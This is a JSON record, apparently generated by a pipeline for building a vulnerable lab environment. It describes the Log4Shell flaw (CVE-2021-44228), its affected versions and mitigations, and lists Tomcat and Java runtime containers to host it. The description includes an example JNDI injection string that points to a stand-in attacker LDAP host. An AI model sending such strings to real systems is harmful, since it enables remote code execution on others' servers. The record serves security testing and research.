{
    "desc": "CVE-2021-44228 (commonly referred to as Log4Shell) is a critical flaw in Apache Log4j 2\u2019s message lookup substitution that enables an attacker to achieve remote code execution when vulnerable applications log attacker-controlled strings that trigger the Java Naming and Directory Interface (JNDI). The issue arises because Log4j 2\u2019s lookup feature processes patterns like ${...}; when the JNDI lookup mechanism (notably JndiLookup) is available, patterns such as ${jndi:ldap://attacker/obj} cause Log4j to perform a JNDI resolution against external services (frequently LDAP, but also Remote Method Invocation, Domain Name System, Internet Inter-ORB Protocol, and others). If the resolution succeeds, the target\u2019s Java runtime may retrieve and instantiate attacker-supplied classes (for example via LDAP returning a codebase that leads to an HTTP fetch), resulting in execution of arbitrary code in the context of the vulnerable application. Any Java application that includes log4j-core on its classpath and logs untrusted input (for example, HTTP headers such as User-Agent, Referer, or Cookie; URL paths or parameters; or other user-influenced fields) can be exposed. Successful exploitation typically requires: (1) a vulnerable version of log4j-core (Log4j 2.x), (2) the ability for an attacker to inject a crafted string that gets logged, (3) JNDI/message lookup behavior enabled (which was the default prior to the fixed releases), and (4) outbound connectivity from the victim to attacker-controlled infrastructure (commonly LDAP and then HTTP). At Internet scale, exploitation has included mass scanning, information theft, installation of backdoors, and deployment of cryptomining software. Affected versions include Log4j 2.0-beta9 through 2.15.0 (with 2.15.0 proving incomplete in certain configurations), as well as 2.15.0-rc1; subsequent fixes removed or disabled the risky behaviors (2.16.0 and later, with further hardening in 2.17.x). Notably, only log4j-core is affected; applications using only log4j-api without the core component are not vulnerable. Mitigations and fixes include upgrading to safe releases (for example, 2.17.1 for Java 8+, or the appropriate long-term support lines such as 2.12.4 for Java 7), removing the JndiLookup class from the log4j-core JAR, disabling JNDI and message lookups, and restricting or blocking outbound LDAP/RMI access to untrusted networks. Related follow-on issues (CVE-2021-45046, CVE-2021-45105, CVE-2021-44832) were addressed in later Log4j 2 versions, and prior mitigations like setting formatMsgNoLookups were found insufficient in some scenarios.",
    "attack_type": "Unauthenticated remote code execution via unsafe JNDI message lookups triggered by logging attacker-controlled input",
    "services": [
        {
            "name": "tomcat",
            "version": [
                "9.0.56-jdk11-openjdk-buster"
            ],
            "dependency_type": "SOFT-WEB",
            "description": "Java application server to host a minimal Java web application that logs user-controlled input using log4j-core. Tomcat provides the HTTP entry point so inputs (e.g., headers/parameters) can be logged, but it is not itself the vulnerable component; the vulnerability exists when the deployed app includes a vulnerable log4j-core."
        },
        {
            "name": "eclipse-temurin",
            "version": [
                "11-jre"
            ],
            "dependency_type": "SOFT",
            "description": "Java runtime base image (if building a custom minimal container instead of using Tomcat\u2019s bundled JRE). Ensures compatibility with vulnerable log4j-core versions used by the application. Not itself vulnerable; required only as a runtime for the Java app that includes log4j-core."
        }
    ],
    "input_tokens": 38729,
    "output_tokens": 3076,
    "query": "CVE-2021-44228 Log4Shell Apache Log4j vulnerability details mitigation detection exploit JNDI LDAP affected versions CVSS timeline references advisories"
}